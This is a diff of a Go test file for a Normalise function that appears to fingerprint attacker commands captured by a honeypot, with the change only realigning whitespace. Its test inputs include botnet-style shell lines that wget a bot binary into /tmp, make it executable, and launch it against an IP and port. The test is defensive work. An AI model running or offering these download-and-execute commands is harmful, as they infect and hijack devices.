@@ -69,9 +69,9 @@ func TestFingerprintIgnoresVolatileTokens(t *testing.T) {
 func TestNormalise(t *testing.T) {
 	cases := map[string]string{
 		"cd /tmp; wget http://45.33.32.156/bins/x86_64.bot -O .x8f2k1; chmod +x .x8f2k1": "cd /tmp; wget http://ip/bins/x86_64.bot -o rnd; chmod +x rnd",
-		"echo -e '\\x47\\x72\\x6f\\x70/' > //.nippon; cat //.nippon; rm -f //.nippon":          "echo -e '\\rnd\\rnd\\x6f\\rnd/' > //.nippon; cat //.nippon; rm -f //.nippon",
-		"/bin/busybox ZORRO; cat /proc/cpuinfo | grep name | wc -l":                           "/bin/busybox zorro; cat /proc/cpuinfo | grep name | wc -l",
-		"kill -9 31337; ./bot.aarch64 203.0.113.9 8080":                                         "kill -9 n; ./bot.aarch64 ip n",
+		"echo -e '\\x47\\x72\\x6f\\x70/' > //.nippon; cat //.nippon; rm -f //.nippon":    "echo -e '\\rnd\\rnd\\x6f\\rnd/' > //.nippon; cat //.nippon; rm -f //.nippon",
+		"/bin/busybox ZORRO; cat /proc/cpuinfo | grep name | wc -l":                      "/bin/busybox zorro; cat /proc/cpuinfo | grep name | wc -l",
+		"kill -9 31337; ./bot.aarch64 203.0.113.9 8080":                                  "kill -9 n; ./bot.aarch64 ip n",
 	}
 	for in, want := range cases {
 		if got := Normalise(in); got != want {
